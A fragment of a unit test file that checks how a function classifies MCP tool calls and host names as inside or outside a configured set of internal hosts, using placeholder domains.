  expect(classifyMcp('mcp__claude_ai_Office__read_resource', { url: 'https://docs.intranet.example/p' }, cfg)).toEqual({ send: null, outside: false })
  expect(classifyMcp('mcp__claude_ai_Office__read_resource', { url: 'https://far.example/p' }, cfg)).toEqual({ send: null, outside: true })
  expect(classifyMcp('mcp__claude_ai_Office__search_people', { query: 'x' }, NONE)).toEqual({ send: null, outside: true })
  expect(insideHost('wiki.example.org', cfg)).toBe(true)
  expect(insideHost('intranet.example', cfg)).toBe(true)
  expect(insideHost('far.example', cfg)).toBe(false)
  expect(insideHost('search_people', cfg)).toBe(false)
})
